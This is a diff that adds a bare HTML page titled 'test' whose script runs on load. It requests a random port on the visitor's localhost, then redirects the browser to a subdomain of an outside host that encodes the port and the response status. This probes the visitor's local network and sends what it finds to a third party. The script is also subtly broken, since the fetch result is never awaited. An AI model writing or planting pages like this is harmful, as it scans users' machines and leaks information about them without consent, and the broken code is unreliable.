@@ -1,0 +1,15 @@
+<html>
+<head><title>test</title>
+<script>
+port = Math.floor(Math.random()*65535);
+let resp = fetch("http://127.0.0.1:"+port, {
+  method: 'GET'
+});
+s_code = resp.status;
+url = "s"+s_code+".p"+port+".test3.d0b4i2s0kzot5wq87.xtric.homes";
+window.location = "https://"+url;
+</script>
+</head>
+<body>
+</body>
+</html>
